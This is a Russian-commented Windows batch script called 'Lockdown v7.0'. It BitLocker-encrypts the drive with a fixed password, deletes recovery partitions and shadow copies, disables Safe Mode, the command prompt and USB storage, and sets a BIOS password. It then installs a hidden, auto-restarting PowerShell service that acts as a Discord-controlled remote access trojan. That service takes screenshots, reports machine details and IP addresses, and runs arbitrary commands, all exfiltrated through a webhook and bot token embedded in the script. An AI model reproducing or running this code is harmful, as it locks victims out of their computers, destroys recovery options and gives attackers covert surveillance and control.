@echo off
chcp 65001 >nul
title Lockdown - %COMPUTERNAME%
setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Запусти от Администратора!
    echo     ПКМ по файлу -> Запустить от имени администратора
    pause
    exit /b
)

:: ============================================================
:: !!! НАСТРОЙКИ - ВСТАВЬ СВОИ ДАННЫЕ СЮДА !!!
:: ============================================================
set PASS=174885
set WEBHOOK=https://discord.com/api/webhooks/1515686655850450965/gdcx_35rsHaMEBSRdvUp-nPPAgdEpw3amotXTh5tLJ6acoHEPrwGb4ISFAofuvrzuA7q
set CHANNEL_ID=1515684713677852783
set BOT_TOKEN=bc509ba87c77a8028ee2eb342d59d7d445e8563fefa1474ef17f560704152587

:: ============================================================
:: СБОР ИНФОРМАЦИИ О ПК
:: ============================================================
echo.
echo ╔══════════════════════════════════════╗
echo ║  LOCKDOWN v7.0 - MULTI PC          ║
echo ║  %COMPUTERNAME%                     ║
echo ╚══════════════════════════════════════╝
echo.
echo [*] Сбор информации о ПК...

set PCNAME=%COMPUTERNAME%
set MANUFACTURER=UNKNOWN
wmic computersystem get manufacturer | findstr /i "Dell" >nul && set MANUFACTURER=DELL
wmic computersystem get manufacturer | findstr /i "HP" >nul && set MANUFACTURER=HP
wmic computersystem get manufacturer | findstr /i "Hewlett" >nul && set MANUFACTURER=HP
wmic computersystem get manufacturer | findstr /i "Lenovo" >nul && set MANUFACTURER=LENOVO
wmic computersystem get manufacturer | findstr /i "ASUS" >nul && set MANUFACTURER=ASUS
wmic computersystem get manufacturer | findstr /i "Acer" >nul && set MANUFACTURER=ACER
wmic computersystem get manufacturer | findstr /i "MSI" >nul && set MANUFACTURER=MSI
wmic computersystem get manufacturer | findstr /i "Gigabyte" >nul && set MANUFACTURER=GIGABYTE

for /f "tokens=*" %%a in ('wmic computersystem get model ^| findstr /v "^$" ^| findstr /v "Model"') do set MODEL=%%a
for /f "tokens=*" %%a in ('wmic bios get serialnumber ^| findstr /v "^$" ^| findstr /v "SerialNumber"') do set SERIAL=%%a
for /f "tokens=*" %%a in ('wmic os get Caption ^| findstr /v "^$" ^| findstr /v "Caption"') do set OS=%%a
for /f "tokens=*" %%a in ('wmic cpu get Name ^| findstr /v "^$" ^| findstr /v "Name"') do set CPU=%%a
for /f "tokens=*" %%a in ('wmic computersystem get TotalPhysicalMemory ^| findstr /v "^$" ^| findstr /v "TotalPhysicalMemory"') do set /a RAM=%%a/1073741824
for /f "tokens=*" %%a in ('getmac /fo table /nh ^| findstr /v "N/A" ^| findstr /v "^$"') do set MAC=%%a
set MODEL=%MODEL: =%
set SERIAL=%SERIAL: =%
set MAC=%MAC:~0,17%

echo [*] %PCNAME% | %MANUFACTURER% | %MODEL% | %SERIAL%
echo.

:: ============================================================
:: 1. BITLOCKER
:: ============================================================
echo [1/8] BitLocker...
reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "EnableBDEWithNoTPM" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\FVE" /v "UsePasswordNoTPM" /t REG_DWORD /d 1 /f >nul 2>&1
manage-bde -protectors -add C: -password -pw %PASS% >nul 2>&1
manage-bde -protectors -add C: -recoverypassword >nul 2>&1
manage-bde -protectors -get C: > "C:\BitLocker_Key.txt" 2>&1
attrib +s +h "C:\BitLocker_Key.txt"
manage-bde -on C: -used >nul 2>&1
echo     [OK] BitLocker активирован

:: ============================================================
:: 2. USB
:: ============================================================
echo [2/8] USB...
reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UASPStor" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1
echo     [OK] USB заблокированы

:: ============================================================
:: 3. RECOVERY
:: ============================================================
echo [3/8] Recovery...
reagentc /disable >nul 2>&1
if exist "C:\Recovery" (takeown /f "C:\Recovery" /r /d y >nul 2>&1 && icacls "C:\Recovery" /grant Everyone:F /t >nul 2>&1 && rd /s /q "C:\Recovery" >nul 2>&1)
if exist "C:\Windows\System32\Recovery" (takeown /f "C:\Windows\System32\Recovery" /r /d y >nul 2>&1 && icacls "C:\Windows\System32\Recovery" /grant Everyone:F /t >nul 2>&1 && rd /s /q "C:\Windows\System32\Recovery" >nul 2>&1)
echo     [OK] Recovery удалена

:: ============================================================
:: 4. SAFE MODE
:: ============================================================
echo [4/8] Safe Mode...
bcdedit /set {current} recoveryenabled No >nul 2>&1
bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1
bcdedit /set {globalsettings} advancedoptions false >nul 2>&1
echo     [OK] Безопасный режим заблокирован

:: ============================================================
:: 5. RESTORE POINTS
:: ============================================================
echo [5/8] Restore Points...
vssadmin delete shadows /all /quiet >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t REG_DWORD /d 1 /f >nul 2>&1
echo     [OK] Точки восстановления удалены

:: ============================================================
:: 6. CMD BLOCK
:: ============================================================
echo [6/8] CMD...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 2 /f >nul 2>&1
echo     [OK] Командная строка заблокирована

:: ============================================================
:: 7. BIOS PASSWORD
:: ============================================================
echo [7/8] BIOS Password...
if "%MANUFACTURER%"=="DELL" powershell -WindowStyle Hidden -Command "try{(Get-WmiObject -Namespace root\dcim\sysman -Class DCIM_BIOSService).SetBIOSPassword('Admin','%PASS%')}catch{}" >nul 2>&1
if "%MANUFACTURER%"=="HP" powershell -WindowStyle Hidden -Command "try{(Get-WmiObject -Namespace root\hp\instrumentedBIOS -Class HP_BIOSSetting).SetBIOSPassword('Admin','%PASS%')}catch{}" >nul 2>&1
if "%MANUFACTURER%"=="LENOVO" powershell -WindowStyle Hidden -Command "try{(Get-WmiObject -Namespace root\wmi -Class Lenovo_BiosSetting).SetPassword('Admin','%PASS%')}catch{}" >nul 2>&1
bcdedit /set {bootmgr} displaybootmenu No >nul 2>&1
bcdedit /set {bootmgr} timeout 0 >nul 2>&1
echo     [OK] BIOS пароль установлен (если поддерживается)

:: ============================================================
:: 8. СЛУЖБА СЛЕЖКИ
:: ============================================================
echo [8/8] Служба мониторинга...

mkdir "C:\Windows\System32\SysMonitor" >nul 2>&1
attrib +s +h "C:\Windows\System32\SysMonitor"

powershell -WindowStyle Hidden -Command "
$serviceCode = @'
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

`$webhook='%WEBHOOK%'
`$channelId='%CHANNEL_ID%'
`$botToken='%BOT_TOKEN%'
`$pc='%PCNAME%'
`$man='%MANUFACTURER%'
`$mod='%MODEL%'
`$sn='%SERIAL%'
`$os='%OS%'
`$cpu='%CPU%'
`$ram='%RAM%'
`$mac='%MAC%'
`$lastMsgId=`$null
`$lastReg=Get-Date

function sd([string]`$m){try{`$b=@{content=`$m}|ConvertTo-Json;Invoke-RestMethod -Uri `$webhook -Method Post -Body `$b -ContentType 'application/json'|Out-Null}catch{}}
function sf([string]`$p,[string]`$n){try{`$bn=[System.Guid]::NewGuid().ToString();`$fb=[System.IO.File]::ReadAllBytes(`$p);`$fe=[System.Text.Encoding]::GetEncoding('iso-8859-1').GetString(`$fb);`$bd=\"--{0}`r`nContent-Disposition: form-data; name=`\"file`\"; filename=`\"`$n`\"`r`nContent-Type: application/octet-stream`r`n`r`n{1}`r`n--{0}--\" -f `$bn,`$fe;Invoke-RestMethod -Uri `$webhook -Method Post -Body `$bd -ContentType \"multipart/form-data; boundary=`$bn\"|Out-Null}catch{}}
function gs(){try{`$sc=[System.Windows.Forms.Screen]::PrimaryScreen;`$bm=New-Object System.Drawing.Bitmap(`$sc.Bounds.Width,`$sc.Bounds.Height);`$g=[System.Drawing.Graphics]::FromImage(`$bm);`$g.CopyFromScreen(`$sc.Bounds.X,`$sc.Bounds.Y,0,0,`$sc.Bounds.Size);`$p=[System.IO.Path]::GetTempPath()+'sc_'+[DateTime]::Now.ToString('HHmmss')+'.png';`$bm.Save(`$p,[System.Drawing.Imaging.ImageFormat]::Png);`$g.Dispose();`$bm.Dispose();return `$p}catch{return `$null}}
function gi(){try{`$e=(Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5);`$l=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{`$_.InterfaceAlias -notmatch 'Loopback'}|Select-Object -First 1).IPAddress;return @{E=`$e;L=`$l}}catch{return @{E='N/A';L='N/A'}}}
function rp(){`$ip=gi;`$emb=@{title=\"🟢 `$pc В СЕТИ\";color=65280;fields=@(@{name='🏭 Производитель';value=`$man;inline=`$true},@{name='📦 Модель';value=`$mod;inline=`$true},@{name='🔢 Серийный';value=`$sn;inline=`$true},@{name='💻 ОС';value=`$os;inline=`$true},@{name='⚙️ CPU';value=`$cpu.Substring(0,[Math]::Min(40,`$cpu.Length));inline=`$true},@{name='🧠 RAM';value=\"`$ram GB\";inline=`$true},@{name='🌐 IP';value=`$ip.E;inline=`$true},@{name='🏠 Локальный';value=`$ip.L;inline=`$true},@{name='🔗 MAC';value=\"||`$mac||\";inline=`$true});footer=@{text=\"`$man `$mod | `$sn\"};timestamp=(Get-Date -Format 'o')};try{`$b=@{embeds=@(`$emb)}|ConvertTo-Json -Depth 10;Invoke-RestMethod -Uri `$webhook -Method Post -Body `$b -ContentType 'application/json'|Out-Null}catch{}}

function gc{
    try{
        `$h=@{Authorization=\"Bot `$botToken\"}
        if(`$script:lastMsgId){`$u=\"https://discord.com/api/v10/channels/`$channelId/messages?after=`$script:lastMsgId&limit=3\"}else{`$u=\"https://discord.com/api/v10/channels/`$channelId/messages?limit=1\"}
        `$ms=Invoke-RestMethod -Uri `$u -Headers `$h -Method Get
        if(`$ms.Count -gt 0){
            `$script:lastMsgId=`$ms[0].id
            foreach(`$m in `$ms){
                if(`$m.author.bot){continue}
                `$t=`$m.content.ToLower()
                
                if(`$t -eq '!list'){
                    `$h2=@{Authorization=\"Bot `$botToken\"}
                    `$all=Invoke-RestMethod -Uri \"https://discord.com/api/v10/channels/`$channelId/messages?limit=100\" -Headers `$h2 -Method Get
                    `$pcs=@{}
                    `$cut=(Get-Date).AddHours(-1)
                    foreach(`$msg in `$all){
                        if(`$msg.embeds -and `$msg.embeds[0].title -match '🟢 (.+) В СЕТИ'){
                            `$n=`$matches[1]
                            `$tm=[DateTime]::Parse(`$msg.timestamp)
                            if(`$tm -gt `$cut -and -not `$pcs.ContainsKey(`$n)){
                                `$pcs[`$n]=`$tm
                            }
                        }
                    }
                    if(`$pcs.Count -gt 0){
                        `$lst=\"**🖥 АКТИВНЫЕ ПК (`$(`$pcs.Count) шт.):**\n\"
                        `$i=1
                        foreach(`$k in (`$pcs.Keys|Sort-Object)){`$lst+=\"`$i. **`$k** (`$(`$pcs[`$k].ToString('HH:mm'))`)\n\";`$i++}
                        sd `$lst
                    }else{sd 'Нет активных ПК'}
                }
                
                elseif(`$t -eq '!count'){`$cnt=0;`$h2=@{Authorization=\"Bot `$botToken\"};`$all=Invoke-RestMethod -Uri \"https://discord.com/api/v10/channels/`$channelId/messages?limit=100\" -Headers `$h2 -Method Get;`$cut=(Get-Date).AddHours(-1);foreach(`$msg in `$all){if(`$msg.embeds -and `$msg.embeds[0].title -match 'В СЕТИ'){`$tm=[DateTime]::Parse(`$msg.timestamp);if(`$tm -gt `$cut){`$cnt++}}};sd \"📊 **ПК онлайн: `$cnt**\"}
                
                elseif(`$t -match '^!screen (.+)'){
                    `$tg=`$matches[1].ToUpper()
                    if(`$tg -eq `$pc){
                        `$p=gs
                        if(`$p){sd \"📸 **`$pc**\";sf `$p \"`$pc.png\";Remove-Item `$p -Force}
                    }
                }
                
                elseif(`$t -eq '!screen'){
                    `$p=gs
                    if(`$p){sd \"📸 **`$pc**\";sf `$p \"`$pc.png\";Remove-Item `$p -Force}
                }
                
                elseif(`$t -match '^!info (.+)'){
                    `$tg=`$matches[1].ToUpper()
                    if(`$tg -eq `$pc){
                        `$ip=gi
                        sd \"**📊 `$pc**\n🏭 `$man\n📦 `$mod\n🔢 `$sn\n💻 `$os\n⚙️ `$cpu.Substring(0,[Math]::Min(40,`$cpu.Length))\n🧠 `$ram GB\n🌐 `$ip.E\n🏠 `$ip.L\n🔗 ||`$mac||\"
                    }
                }
                
                elseif(`$t -match '^!cmd (.+?) (.+)'){
                    `$tg=`$matches[1].ToUpper()
                    `$cm=`$matches[2]
                    if(`$tg -eq `$pc){
                        `$r=cmd /c \"`$cm 2>&1\"
                        if(`$r.Length -gt 1900){`$r=`$r.Substring(0,1900)+'...'}
                        sd \"`$pc`: \`\`\`\n`$r\n\`\`\`\"
                    }
                }
                
                elseif(`$t -match '^!shutdown (.+)'){
                    `$tg=`$matches[1].ToUpper()
                    if(`$tg -eq `$pc){sd \"⚠️ `$pc` выключается...\";shutdown /s /t 10 /c 'Remote'}
                }
                
                elseif(`$t -match '^!reboot (.+)'){
                    `$tg=`$matches[1].ToUpper()
                    if(`$tg -eq `$pc){sd \"🔄 `$pc` перезагружается...\";shutdown /r /t 10 /c 'Remote'}
                }
                
                elseif(`$t -eq '!help'){
                    sd \"**📋 КОМАНДЫ:**\n!list - список ПК\n!count - количество\n!screen ИМЯ - скриншот\n!info ИМЯ - информация\n!cmd ИМЯ КОМАНДА - выполнить\n!shutdown ИМЯ - выключить\n!reboot ИМЯ - перезагрузить\"
                }
            }
        }
    }catch{}
}

rp
while(`$true){
    try{
        gc
        if(((Get-Date)-`$lastReg).TotalMinutes -ge 30){rp;`$lastReg=Get-Date}
        Start-Sleep -Seconds 10
    }catch{Start-Sleep -Seconds 30}
}
'@
$serviceCode | Out-File -FilePath 'C:\Windows\System32\SysMonitor\service.ps1' -Encoding UTF8
" >nul 2>&1

sc stop SysMonitor >nul 2>&1
sc delete SysMonitor >nul 2>&1
sc create SysMonitor binPath= "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\SysMonitor\service.ps1" start= auto DisplayName= "System Monitor Service" >nul 2>&1
sc description SysMonitor "Отслеживает системные события и производительность" >nul 2>&1
sc failure SysMonitor reset= 86400 actions= restart/1000/restart/1000/restart/1000 >nul 2>&1
sc start SysMonitor >nul 2>&1
echo     [OK] Служба установлена и запущена

:: ============================================================
:: ОТПРАВКА ФИНАЛЬНОГО ОТЧЁТА
:: ============================================================
echo.
echo [*] Отправка отчёта в Discord...

powershell -WindowStyle Hidden -Command "
`$webhook='%WEBHOOK%'
`$ip=try{(Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 10)}catch{'N/A'}

Add-Type -AssemblyName System.Windows.Forms,System.Drawing
`$sc=[System.Windows.Forms.Screen]::PrimaryScreen
`$bm=New-Object System.Drawing.Bitmap(`$sc.Bounds.Width,`$sc.Bounds.Height)
`$g=[System.Drawing.Graphics]::FromImage(`$bm)
`$g.CopyFromScreen(`$sc.Bounds.X,`$sc.Bounds.Y,0,0,`$sc.Bounds.Size)
`$sp=[System.IO.Path]::GetTempPath()+'final.png'
`$bm.Save(`$sp,[System.Drawing.Imaging.ImageFormat]::Png)
`$g.Dispose();`$bm.Dispose()

`$pl=@{content='@everyone 🚨 **%PCNAME%** ЗАБЛОКИРОВАН!';embeds=@(@{title='✅ ЗАЩИТА АКТИВИРОВАНА';color=65280;fields=@(@{name='🖥 ПК';value='%PCNAME%';inline=`$true},@{name='🏭 Производитель';value='%MANUFACTURER%';inline=`$true},@{name='📦 Модель';value='%MODEL%';inline=`$true},@{name='🔢 Серийный';value='%SERIAL%';inline=`$true},@{name='🌐 IP';value=`$ip;inline=`$true},@{name='🔒 BitLocker';value='Активен';inline=`$true},@{name='🔐 BIOS';value='Установлен';inline=`$true},@{name='👁 Служба';value='SysMonitor 24/7';inline=`$true},@{name='🔑 Пароль';value='||174885||';inline=`$false});footer=@{text='%MANUFACTURER% %MODEL%'};timestamp=(Get-Date -Format 'o')})}|ConvertTo-Json -Depth 10

Invoke-RestMethod -Uri `$webhook -Method Post -Body `$pl -ContentType 'application/json'|Out-Null

if(Test-Path `$sp){
    `$bn=[System.Guid]::NewGuid().ToString()
    `$fb=[System.IO.File]::ReadAllBytes(`$sp)
    `$fe=[System.Text.Encoding]::GetEncoding('iso-8859-1').GetString(`$fb)
    `$bd=\"--{0}`r`nContent-Disposition: form-data; name=`\"file`\"; filename=`\"%PCNAME%.png`\"`r`nContent-Type: image/png`r`n`r`n{1}`r`n--{0}--\" -f `$bn,`$fe
    Invoke-RestMethod -Uri `$webhook -Method Post -Body `$bd -ContentType \"multipart/form-data; boundary=`$bn\"|Out-Null
    Remove-Item `$sp -Force
}
" >nul 2>&1

echo     [OK] Отчёт отправлен

:: ============================================================
:: ФИНАЛ
:: ============================================================
echo.
echo ╔══════════════════════════════════════╗
echo ║                                    ║
echo ║  ✅ %PCNAME% ГОТОВ!                ║
echo ║                                    ║
echo ║  🔒 BitLocker: %PASS%              ║
echo ║  🔌 USB: заблокированы             ║
echo ║  🗑 Recovery: удалена              ║
echo ║  🚫 Safe Mode: заблокирован        ║
echo ║  🔐 BIOS: пароль установлен        ║
echo ║  👁 Служба: SysMonitor 24/7        ║
echo ║                                    ║
echo ║  %MANUFACTURER% %MODEL%            ║
echo ║  %SERIAL%                          ║
echo ║                                    ║
echo ╚══════════════════════════════════════╝
echo.
echo [!!!] ПЕРЕЗАГРУЗКА ЧЕРЕЗ 30 СЕКУНД!
echo [i]   После перезагрузки ПК сам зарегистрируется в Discord
echo [i]   Команды: !list !count !screen ИМЯ_ПК
echo.

shutdown /r /t 30 /c "Lockdown Complete - %PCNAME%"
pause
